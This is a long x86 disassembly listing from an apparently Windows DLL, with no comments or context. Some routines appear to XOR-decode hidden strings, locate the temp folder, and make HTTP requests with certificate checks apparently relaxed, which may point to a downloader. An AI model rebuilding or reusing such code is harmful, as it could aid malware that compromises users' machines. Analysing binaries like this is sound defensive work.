mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10013950
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1006f961
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10034a80
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10060ef0
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004642f
retn 0x20
sub_10071980
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
lea ebx [ ebp - 0x44 ]
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] eax
call sub_100733f0
mov ebx [ ebp + 0x10 ]
push ebx
lea eax [ ebp - 0x44 ]
push esi
push eax
call sub_10066f50
lea edi [ ebp - 0x44 ]
call sub_10073460
mov edi [ ebp - 0x38 ]
push esi
push ebx
push r--data
call sub_10020200
add esp 0x18
xor ebx ebx
mov ecx [ ebp - 0x38 ]
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
mov [ edi + 0x34 ] 0x0
jmp r-xdata
xor eax eax
mov ecx [ ecx + 0x8 ]
mov eax [ ecx + eax * 4 - 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x34 ]
mov eax r--data
cmp ecx 0x3
ja r-xdata
mov ebx 0x1
test ebx ebx
je r-xdata
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov ecx [ edi ]
mov edx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x30 ]
push edx
push ecx
push eax
push r--data
call sub_10020200
lea edx [ ebp - 0x34 ]
mov eax 0x1
add esp 0x14
mov [ edi + 0x68 ] edx
cmp [ ebp - 0x34 ] eax
jne r-xdata
jmp [ ecx * 4 + jump_table_10071bb4 ]
mov eax 0x1
jmp r-xdata
mov [ edi + 0x38 ] eax
lea eax [ ebp - 0x44 ]
push eax
lea esi [ ebp - 0x34 ]
call sub_10078d20
add esp 0x4
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax r--data
jmp r-xdata
mov edx [ ebp - 0x1c ]
push edx
call sub_10068a50
add esp 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
push eax
call sub_10068a50
add esp 0x4
jmp r-xdata
mov eax r--data
push eax
lea edx [ ebp - 0x44 ]
push edx
call sub_1003dbf0
lea eax [ ebp - 0x34 ]
push eax
lea ecx [ ebp - 0x44 ]
push ecx
call sub_10023700
add esp 0x10
test eax eax
je r-xdata
mov ebx 0x1
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x34 ] 0x7
jne r-xdata
lea ecx [ ebp - 0x44 ]
push ecx
lea eax [ ebp - 0x34 ]
call sub_100736d0
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp - 0x48 ]
cmp [ edx + 0x10 ] 0x0
je r-xdata
cmp [ edi + 0x34 ] 0x0
je r-xdata
mov [ eax ] 0x29
cmp [ edi + 0x34 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
lea eax [ ebp - 0x44 ]
call sub_10075670
mov eax [ ebp - 0x40 ]
mov esi [ eax ]
cmp [ esi + 0x20 ] 0x0
jne r-xdata
cmp [ esi + 0x24 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x44 ]
push r--data
push ecx
call sub_1004c490
add esp 0x8
mov [ esi + 0x20 ] eax
cmp [ esi + 0x28 ] 0x0
jne r-xdata
lea edx [ ebp - 0x44 ]
push r--data
push edx
call sub_1004c490
add esp 0x8
mov [ esi + 0x24 ] eax
mov esi [ ebp - 0x38 ]
lea ecx [ esi + 0x14 ]
push ecx
lea edx [ ebp - 0x44 ]
push edx
call sub_1005e540
lea eax [ esi + 0x8 ]
push eax
lea ecx [ ebp - 0x44 ]
push ecx
call sub_1005e540
lea edx [ esi + 0x20 ]
push edx
lea eax [ ebp - 0x44 ]
push eax
call sub_1005e540
lea ecx [ esi + 0x48 ]
push ecx
lea edx [ ebp - 0x44 ]
push edx
call sub_1004af10
lea eax [ ebp - 0x44 ]
push esi
push eax
call sub_10021f70
lea ecx [ ebp - 0x44 ]
push ecx
call sub_10003f50
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x40 ]
add esp 0x2c
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x44 ]
push r--data
push eax
call sub_1004c490
add esp 0x8
mov [ esi + 0x28 ] eax
sub_10071bc4
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push eax
push r--data
lea eax [ ebp - 0x44 ]
push 0x40
push eax
mov ebx ecx
call sub_1005c1c5
push eax
lea eax [ ebp - 0x44 ]
push eax
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push ebx
call sub_1001caa1
mov ecx [ ebp - 0x4 ]
add esp 0x30
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x18
sub_10071c21
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
cmp eax ecx
jae r-xdata
mov edi [ ebp + 0xc ]
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_1002d84e
test edi edi
je r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x8
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
sub eax edi
add eax eax
push eax
lea eax [ ecx + edi ]
lea eax [ ebx + eax * 2 ]
push eax
lea eax [ edx + ecx * 2 ]
push eax
call sub_1007ec90
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
xor edx edx
mov [ ecx + eax * 2 ] dx
sub_10071cb0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008817c
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
cmp [ ebx + 0x2e4 ] 0x0
mov [ ebp - 0xe0 ] ebx
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x5b
call sub_10072600
lea edx [ ebp - 0x34 ]
mov eax 0x59
call sub_10072600
xor edi edi
mov ecx edx
cmp [ ebx + 0xb0 ] edi
jne r-xdata
mov eax 0x64
jmp r-xdata
xor eax eax
mov [ ebp - 0x50 ] ax
mov eax ecx
mov [ ebp - 0x3c ] 0x7
mov [ ebp - 0x40 ] edi
lea esi [ eax + 0x2 ]
lea ecx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov dx [ eax ]
add eax 0x2
cmp dx di
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push ecx
lea ecx [ ebp - 0x50 ]
call sub_1005ddc0
mov [ ebp - 0x4 ] edi
movzx eax [ ebx + 0x20 ]
cdq
push edx
push eax
lea esi [ ebp - 0xdc ]
call sub_100012f0
mov edi eax
lea ecx [ ebp - 0x50 ]
push ecx
lea edx [ ebp - 0xc0 ]
add ebx 0x4
push edx
mov [ ebp - 0x4 ] 0x1
call sub_10024600
push eax
mov edx r--data
lea esi [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0x2
call sub_1001ccb0
add esp 0x14
mov ecx eax
mov eax edi
lea edi [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x3
call sub_10057920
mov ecx eax
mov edi [ ebp - 0xe0 ]
lea eax [ edi + 0x24 ]
lea esi [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0x4
call sub_10038800
push eax
lea ecx [ edi + 0x2c4 ]
mov [ ebp - 0x4 ] 0x5
call sub_100649e0
cmp [ ebp - 0x58 ] 0x8
jb r-xdata
xor ebx ebx
xor ecx ecx
cmp [ ebp - 0x90 ] 0x8
mov esi 0x7
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x6c ] cx
jb r-xdata
mov eax [ ebp - 0x6c ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
cmp [ ebp - 0x74 ] 0x8
mov [ ebp - 0x90 ] esi
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0xa4 ] ax
jb r-xdata
mov edx [ ebp - 0xa4 ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
cmp [ ebp - 0xac ] 0x8
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x88 ] dx
jb r-xdata
mov ecx [ ebp - 0x88 ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
cmp [ ebp - 0xc8 ] 0x8
mov [ ebp - 0xac ] esi
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xc0 ] cx
jb r-xdata
mov eax [ ebp - 0xc0 ]
push eax
call sub_100187af
add esp 0x4
lea esi [ edi + 0xb8 ]
push esi
push 0x104
call [ GetTempPathW@IAT ]
test eax eax
jne r-xdata
mov edx [ ebp - 0xdc ]
push edx
call sub_100187af
add esp 0x4
cmp [ ebp - 0x3c ] 0x8
jb r-xdata
mov edi r--data
mov edx 0x104
mov eax esi
sub edi esi
nop
xor eax eax
mov eax [ ebp - 0x50 ]
push eax
call sub_100187af
add esp 0x4
cmp edx ebx
jne r-xdata
movzx ecx [ edi + eax ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
sub_10071f2c
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1003ba85
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_10071fd0
push ebp
mov ebp esp
push 0xffffffff
push sub_100880c6
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x1c ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
mov ebx ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0xd8 ] eax
xor eax eax
mov [ ecx ] eax
mov [ ebp - 0xc0 ] ecx
push 0xffffffff
xor ecx ecx
mov [ ebp - 0xd0 ] edx
mov [ edx ] eax
push eax
lea edx [ ebx + 0x24 ]
mov [ ebp - 0x98 ] cx
push edx
lea ecx [ ebp - 0x98 ]
mov [ ebp - 0xb8 ] eax
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xc4 ] eax
mov [ ebp - 0xcc ] eax
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0x84 ] 0x7
mov [ ebp - 0x88 ] eax
call sub_100404a0
mov [ ebp - 0x4 ] 0x0
cmp [ ebx + 0xec ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ ebp - 0x84 ] 0x8
jb r-xdata
cmp eax 0x1
jne r-xdata
push esi
mov ecx edi
lea esi [ ebp - 0xb4 ]
call sub_100704c0
add esp 0x4
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x98 ]
mov [ ebp - 0x4 ] 0x1
call sub_10017b50
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0xa0 ] 0x8
jb r-xdata
mov eax 0x64
jmp r-xdata
mov eax [ ebp - 0x98 ]
push eax
call sub_100187af
add esp 0x4
cmp [ ebp - 0x84 ] 0x8
mov eax [ ebp - 0x98 ]
jae r-xdata
lea edx [ ebp - 0x1c ]
xor eax eax
call sub_10072600
lea edx [ ebp - 0x7c ]
mov eax 0xf
call sub_10072600
lea edx [ ebp - 0x1c ]
lea eax [ ebp - 0x7c ]
mov [ ebp - 0xbc ] edx
mov [ ebp - 0xc4 ] eax
mov [ ebp - 0xcc ] esi
mov [ ebp - 0xc8 ] edi
mov ecx [ ebp - 0xb4 ]
push ecx
call sub_100187af
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x18
mov ecx [ ebx + 0xb0 ]
mov edx [ ebp - 0xbc ]
neg ecx
sbb ecx ecx
and ecx 0x800000
push ecx
mov ecx [ ebx + 0xe0 ]
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0xbc ]
push edx
push eax
call ecx
mov esi eax
mov [ ebp - 0xbc ] esi
test esi esi
jne r-xdata
lea eax [ ebp - 0x98 ]
mov eax [ ebx + 0xc8 ]
push 0x4
lea edx [ ebp - 0xd4 ]
push edx
push 0x3f
mov edi 0x2
push esi
mov [ ebp - 0xd4 ] edi
call eax
test eax eax
jne r-xdata
mov [ ebp - 0xb8 ] 0x1
jmp r-xdata
cmp [ ebx + 0xb0 ] 0x0
je r-xdata
mov [ ebp - 0xb8 ] edi
jmp r-xdata
mov esi [ ebp - 0xc0 ]
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ ebx + 0x6c ]
lea ecx [ ebx + 0x5c ]
push r--data
xor edi edi
call sub_1001a2f0
test eax eax
je r-xdata
cmp [ ebx + 0xb4 ] 0x0
je r-xdata
mov ecx [ ebx + 0xd4 ]
push esi
call ecx
cmp [ ebp - 0xb8 ] 0x0
je r-xdata
cmp [ ebp - 0x84 ] 0x8
jb r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ ebp - 0xd0 ]
mov [ esi ] 0x0
mov [ edx ] 0x0
mov eax [ ebp - 0xc8 ]
mov ecx [ ebp - 0xcc ]
mov edx [ ebp - 0xc4 ]
push 0x0
push eax
push eax
mov eax [ ebx + 0xe4 ]
push ecx
push 0xffffffff
push edx
push esi
call eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x88 ]
lea ecx [ ebx + 0x78 ]
push r--data
call sub_1001a2f0
test eax eax
je r-xdata
mov edx [ ebx + 0xc8 ]
push 0x4
lea ecx [ ebp - 0xe0 ]
push ecx
push 0x1f
push esi
mov [ ebp - 0xe0 ] 0x3100
call edx
mov eax [ ebp - 0xb8 ]
mov eax [ ebp - 0x98 ]
push eax
call sub_100187af
add esp 0x4
mov ecx [ ebx + 0xe8 ]
push 0x0
push esi
call ecx
test eax eax
jne r-xdata
mov [ ebp - 0xb8 ] 0x4
jmp r-xdata
lea edi [ ebx + 0x94 ]
mov ecx edi
call sub_1005bef0
test al al
je r-xdata
mov edi [ ebp - 0xd8 ]
mov eax [ ebx + 0xd8 ]
push 0x0
lea edx [ ebp - 0xdc ]
push edx
push edi
push 0x0
push 0x20000013
push esi
mov [ ebp - 0xdc ] 0x4
call eax
test eax eax
jne r-xdata
mov [ ebp - 0xb8 ] 0x5
jmp r-xdata
mov ecx 0x8
cmp [ edi + 0x14 ] ecx
jb r-xdata
cmp [ edi ] 0x12e
je r-xdata
mov [ ebp - 0xb8 ] 0x6
jmp r-xdata
cmp [ ebx + 0x8c ] ecx
lea eax [ ebx + 0x78 ]
jb r-xdata
mov edi [ edi ]
mov edi [ ebp - 0xc0 ]
push esi
mov esi [ ebp - 0xd0 ]
call sub_10062e80
mov esi [ ebp - 0xbc ]
mov [ ebp - 0xb8 ] eax
push 0x0
push edi
push eax
mov eax [ ebx + 0xcc ]
push 0x1
push 0x1
push esi
call eax
test eax eax
jne r-xdata
mov eax [ eax ]
mov [ ebp - 0xb8 ] 0x3
jmp r-xdata
sub_10072390
push ebp
mov ebp esp
push 0xffffffff
push sub_10086a08
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov esi ecx
mov edi [ esi ]
lea ecx [ ebp - 0x54 ]
push ecx
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x54 ] 0x0
call sub_10029450
mov [ ebp - 0x64 ] eax
test eax eax
je r-xdata
mov ebx [ ebp - 0x54 ]
push 0x4
push 0x0
mov [ ebp - 0x58 ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0xc4
call sub_10053240
mov edi [ ebp - 0x54 ]
test edi edi
je r-xdata
xor esi esi
mov [ eax ] 0x0
mov esi eax
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x64 ]
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
mov eax edi
call sub_1001f5f0
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
jmp r-xdata
mov esi [ ebp - 0x5c ]
mov edi [ HeapFree@IAT ]
test ebx ebx
je r-xdata
inc [ esi ]
mov [ ebp - 0x54 ] esi
mov edi [ ebp - 0x60 ]
lea edx [ ebp - 0x58 ]
push edx
mov [ ebp - 0x4 ] 0x0
call sub_1002cc00
mov [ ebp - 0x4 ] 0xffffffff
dec [ esi ]
jne r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
mov eax ebx
call sub_1001f5f0
push ebx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
sub_100724b7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
pop ebp
retn
push eax
push 0x0
call sub_1004d707
pop ecx
pop ecx
sub_100724e0
push ebp
mov ebp esp
sub esp 0x10
push ebx
push edi
xor edi edi
xor ebx ebx
cmp esi edi
je r-xdata
pop edi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov edx [ eax + 0x28 ]
lea ecx [ ebp - 0x10 ]
push ecx
push esi
call edx
cmp [ ebp - 0x10 ] 0x1
jne r-xdata
pop edi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov edx [ eax + 0x44 ]
lea ecx [ ebp - 0x8 ]
push ecx
push esi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call edx
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0xc ]
mov [ ebp - 0xc ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x2c ]
call eax
cmp [ ebp - 0xc ] edi
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
lea edx [ ebp - 0x4 ]
push edx
mov edx [ ebp + 0x8 ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
mov eax [ ebp - 0x4 ]
cmp eax edi
jne r-xdata
lea ebx [ edi + 0x3 ]
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov ebx 0x4
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax edi
je r-xdata
mov eax [ ebp - 0x8 ]
cmp eax edi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] edi
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_100725a4
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10026155
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_10072600
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10072650
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
push esi
mov esi [ eax ]
mov [ edx + 0x8 ] esi
mov esi [ eax ]
cmp [ esi + 0x15 ] 0x0
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
pop esi
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
mov [ ecx + 0x8 ] eax
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
mov [ ecx ] eax
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
sub_100726b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087f68
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
call j_sub_1005b90d
test al al
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ edx + eax + 0x38 ]
test eax eax
je r-xdata
mov ecx [ esi ]
call sub_10035c70
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
sub_10072720
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor eax eax
push edi
test esi esi
je r-xdata
pop edi
pop esi
mov eax 0x8007007a
mov [ ecx - 0x1 ] 0x0
pop ebx
pop ebp
retn 0x4
mov ebx [ ebp + 0x8 ]
mov edi edx
sub ebx ecx
test esi esi
jne r-xdata
mov dl [ ebx + ecx ]
test dl dl
je r-xdata
pop edi
pop esi
mov [ ecx ] al
pop ebx
pop ebp
retn 0x4
mov [ ecx ] dl
inc ecx
dec edi
dec esi
jne r-xdata
test edi edi
je r-xdata
pop edi
pop esi
mov eax 0x8007007a
mov [ ecx - 0x1 ] 0x0
pop ebx
pop ebp
retn 0x4
sub_10072780
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
lea eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push 0x0
push ecx
push edx
push eax
call sub_10028ffe
add esp 0x14
pop ebp
retn
sub_100727a0
xor eax eax
test edx edx
je r-xdata
mov eax 0x80070057
cmp edx 0x7fffffff
jbe r-xdata
mov [ edi ] 0x0
retn
xor eax eax
push esi
mov esi edx
test edx edx
je r-xdata
test eax eax
js r-xdata
mov eax 0x80070057
cmp [ ecx ] ax
je r-xdata
pop esi
retn
test eax eax
js r-xdata
test esi esi
jne r-xdata
add ecx 0x2
dec esi
jne r-xdata
mov [ edi ] 0x0
sub edx esi
mov [ edi ] edx
pop esi
retn
test edi edi
je r-xdata
jmp r-xdata
sub_10072800
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor eax eax
push edi
test esi esi
je r-xdata
sub ecx 0x2
mov eax 0x8007007a
mov ebx [ ebp + 0x8 ]
mov edi edx
sub ebx ecx
test esi esi
jne r-xdata
movzx edx [ ebx + ecx ]
test dx dx
je r-xdata
pop edi
xor edx edx
pop esi
mov [ ecx ] dx
pop ebx
pop ebp
retn 0x4
mov [ ecx ] dx
add ecx 0x2
dec edi
dec esi
jne r-xdata
test edi edi
je r-xdata
pop edi
sub ecx 0x2
xor edx edx
pop esi
mov eax 0x8007007a
mov [ ecx ] dx
pop ebx
pop ebp
retn 0x4
sub_10072870
mov ecx 0x9
xor eax eax
test ecx ecx
jne r-xdata
add edx 0x2
dec ecx
jne r-xdata
test esi esi
je r-xdata
mov eax 0x80070057
cmp [ edx ] ax
je r-xdata
jmp r-xdata
retn
test eax eax
js r-xdata
mov [ esi ] 0x0
mov edx 0x9
sub edx ecx
mov [ esi ] edx
retn
sub_100728b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10084cd0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x4c ] ebx
mov eax [ edi ]
cmp eax 0x2
jne r-xdata
cmp eax 0x1
jne r-xdata
mov edi [ edi + 0x10 ]
mov eax edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
lea edx [ eax + 0x1 ]
push ebx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
push r--data
mov eax [ edi + 0x1c ]
cmp eax 0x7
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
jmp r-xdata
cmp eax 0x6
je r-xdata
mov ecx esi
call sub_10037e00
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001000
cmp [ edi + 0x14 ] 0x0
mov [ ebp - 0x4 ] ebx
jbe r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov ecx esi
mov [ esi ] 0x0
call sub_10021bf0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov eax [ edi + 0x10 ]
mov ecx [ eax + ebx * 4 ]
push ecx
lea edx [ ebp - 0x48 ]
push edx
call sub_100728b0
add esp 0x8
mov [ ebp - 0x4 ] 0x1
test ebx ebx
je r-xdata
